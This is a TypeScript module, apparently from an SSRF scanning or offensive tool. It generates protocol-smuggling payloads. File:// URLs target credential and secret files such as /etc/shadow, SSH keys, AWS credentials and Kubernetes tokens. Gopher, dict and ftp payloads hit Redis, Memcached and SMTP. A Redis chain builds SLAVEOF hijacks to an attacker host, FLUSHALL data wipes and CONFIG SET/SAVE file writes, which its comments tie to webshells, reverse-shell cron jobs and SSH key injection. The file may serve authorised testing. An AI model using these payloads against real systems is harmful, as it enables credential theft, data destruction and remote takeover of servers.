/**
 * Protocol Smuggling — file, gopher, dict, ftp, data URI payloads.
 *
 * Generates SSRF payloads that abuse alternative URL schemes the
 * server-side HTTP client may support beyond http/https.
 */

export interface ProtocolPayload {
  protocol: string;
  payload: string;
  detail?: string;
}

// ── Sensitive file paths (50+) ────────────────────────────────────────

const LINUX_SYSTEM_FILES = [
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/resolv.conf",
  "/etc/issue",
  "/etc/motd",
  "/etc/crontab",
  "/etc/fstab",
  "/etc/group",
  "/etc/sudoers",
  "/proc/self/environ",
  "/proc/self/cmdline",
  "/proc/self/fd/0",
  "/proc/version",
  "/proc/net/tcp",
  "/proc/net/arp",
  "/proc/self/maps",
  "/proc/self/status",
];

const APP_CONFIG_FILES = [
  ".env",
  ".env.local",
  ".env.production",
  "config.yml",
  "config.json",
  ".git/config",
  ".git/HEAD",
  ".svn/entries",
  ".htaccess",
  ".htpasswd",
  "wp-config.php",
  "web.config",
  "application.properties",
  "appsettings.json",
  "database.yml",
];

const SSH_CRYPTO_FILES = [
  "/root/.ssh/id_rsa",
  "/root/.ssh/authorized_keys",
  "/root/.ssh/known_hosts",
  "/home/user/.ssh/id_rsa",
  "/root/.bash_history",
  "/root/.mysql_history",
];

const CLOUD_CONTAINER_FILES = [
  "/var/run/secrets/kubernetes.io/serviceaccount/token",
  "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
  "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
  "/.dockerenv",
  "/run/secrets/db_password",
  "/root/.aws/credentials",
  "/root/.aws/config",
  "/root/.azure/accessTokens.json",
  "/root/.config/gcloud/credentials.db",
];

const WINDOWS_FILES = [
  "C:/Windows/win.ini",
  "C:/Windows/system.ini",
  "C:/inetpub/wwwroot/web.config",
  "C:/boot.ini",
  "C:/Windows/System32/drivers/etc/hosts",
];

const PATH_TRAVERSAL_VARIANTS = [
  "../../../../etc/passwd",
  "../../../.env",
  "....//....//etc/passwd",
  "..%252f..%252fetc/passwd",
];

const ALL_FILE_PATHS = [
  ...LINUX_SYSTEM_FILES,
  ...APP_CONFIG_FILES,
  ...SSH_CRYPTO_FILES,
  ...CLOUD_CONTAINER_FILES,
  ...WINDOWS_FILES,
  ...PATH_TRAVERSAL_VARIANTS,
];

export function generateProtocolSmugglingPayloads(targetHost: string): ProtocolPayload[] {
  const payloads: ProtocolPayload[] = [];

  // file://
  for (const filePath of ALL_FILE_PATHS) {
    payloads.push({
      protocol: "file",
      payload: `file://${filePath}`,
      detail: `File read: ${filePath}`,
    });
  }

  // gopher:// — Redis INFO (read-only)
  payloads.push({
    protocol: "gopher",
    payload: `gopher://${targetHost}:6379/_${encodeURIComponent("INFO\r\n")}`,
    detail: "Gopher Redis INFO (read-only)",
  });

  // gopher:// — HTTP request smuggling
  const httpReq = `GET / HTTP/1.1\r\nHost: ${targetHost}\r\nConnection: close\r\n\r\n`;
  payloads.push({
    protocol: "gopher",
    payload: `gopher://${targetHost}:80/_${encodeURIComponent(httpReq)}`,
    detail: "Gopher HTTP request smuggling",
  });

  // gopher:// — Memcached
  payloads.push({
    protocol: "gopher",
    payload: `gopher://${targetHost}:11211/_stats`,
    detail: "Gopher Memcached stats",
  });
  payloads.push({
    protocol: "gopher",
    payload: `gopher://${targetHost}:11211/_get%20key`,
    detail: "Gopher Memcached key read",
  });

  // gopher:// — SMTP
  const smtpCmd = `HELO ssrf\r\nMAIL FROM:<test@ssrf>\r\nRCPT TO:<admin@${targetHost}>\r\nDATA\r\nSubject: SSRF\r\ntest\r\n.\r\n`;
  payloads.push({
    protocol: "gopher",
    payload: `gopher://${targetHost}:25/_${encodeURIComponent(smtpCmd)}`,
    detail: "Gopher SMTP email smuggling",
  });

  // dict://
  payloads.push({
    protocol: "dict",
    payload: `dict://${targetHost}:11211/stats`,
    detail: "Dict Memcached stats",
  });
  payloads.push({
    protocol: "dict",
    payload: `dict://${targetHost}:6379/INFO`,
    detail: "Dict Redis INFO",
  });

  // ftp://
  payloads.push({
    protocol: "ftp",
    payload: `ftp://anonymous:anonymous@${targetHost}:21/`,
    detail: "FTP anonymous login",
  });
  payloads.push({
    protocol: "ftp",
    payload: `ftp://${targetHost}:21/file.txt`,
    detail: "FTP file download",
  });

  // data://
  payloads.push({
    protocol: "data",
    payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    detail: "Data URI HTML payload",
  });
  payloads.push({
    protocol: "data",
    payload: "data:text/plain;charset=utf-8,hello%20world",
    detail: "Data URI plain text",
  });

  return payloads;
}

// ── Redis attack chain ────────────────────────────────────────────────

/**
 * A filesystem write payload for the Redis attack chain.
 *
 * Content is loaded at runtime from external template files, never
 * embedded in source. Real-world Redis SSRF write chains use:
 *   1. Webshell     — written to web root, loaded from payloads/webshell.txt
 *   2. Cron job     — reverse shell via /var/spool/cron/crontabs/root
 *   3. SSH key      — authorized_keys injection via /root/.ssh/
 *
 * See: Orange Tsai (Black Hat 2017), HackTricks Redis RCE,
 * PortSwigger SSRF cheat sheet.
 */
export interface RedisWritePayload {
  dir: string;
  filename: string;
  content: string;
  key?: string;
}

export interface RedisAttackOptions {
  /** Attacker host for SLAVEOF replication. Read from ENIGMA_ATTACKER_HOST env at CLI level. */
  attackerHost: string;
  /** Attacker port. Read from ENIGMA_ATTACKER_PORT env at CLI level. */
  attackerPort: number;
  /** Target Redis host. Defaults to localhost (127.0.0.1). */
  redisHost?: string;
  /** Target Redis port. Defaults to 6379. */
  redisPort?: number;
  /**
   * Filesystem write payloads. When empty, only reconnaissance
   * and non-write commands are generated. Callers load these
   * from external template files at scan time.
   */
  writes?: RedisWritePayload[];
}

/**
 * Generates a progressive Redis exploitation chain via gopher protocol.
 *
 * Reconnaissance: INFO (read-only).
 * Escalation: SLAVEOF replication hijack, FLUSHALL wipe.
 * Filesystem writes: only when caller supplies write payloads
 * loaded from external template files — this module ships zero
 * payload content in source.
 */
export function generateRedisAttackPayloads(
  options: RedisAttackOptions
): Array<{ technique: string; payload: string; dangerous: boolean }> {
  const {
    attackerHost,
    attackerPort,
    redisHost = "127.0.0.1",
    redisPort = 6379,
    writes = [],
  } = options;

  const results: Array<{ technique: string; payload: string; dangerous: boolean }> = [];

  const gopher = (cmd: string) =>
    `gopher://${redisHost}:${redisPort}/_${encodeURIComponent(cmd)}`;

  // Reconnaissance (read-only)
  results.push({ technique: "INFO", payload: gopher("INFO\r\n"), dangerous: false });

  // Replication hijack
  results.push({ technique: "SLAVEOF", payload: gopher(`SLAVEOF ${attackerHost} ${attackerPort}\r\n`), dangerous: true });

  // Data wipe
  results.push({ technique: "FLUSHALL", payload: gopher("FLUSHALL\r\n"), dangerous: true });

  // Filesystem writes — only if caller provided external payloads
  for (const w of writes) {
    const key = w.key ?? "payload";
    results.push({ technique: `CONFIG SET dir [${w.dir}]`, payload: gopher(`CONFIG SET dir ${w.dir}\r\n`), dangerous: true });
    results.push({ technique: `CONFIG SET dbfilename [${w.filename}]`, payload: gopher(`CONFIG SET dbfilename ${w.filename}\r\n`), dangerous: true });
    results.push({ technique: `SET ${key}`, payload: gopher(`SET ${key} "${w.content}"\r\n`), dangerous: true });
    results.push({ technique: "SAVE", payload: gopher("SAVE\r\n"), dangerous: true });
  }

  // SAVE even without writes (triggers RDB dump to default location)
  if (writes.length === 0) {
    results.push({ technique: "SAVE", payload: gopher("SAVE\r\n"), dangerous: true });
  }

  return results;
}
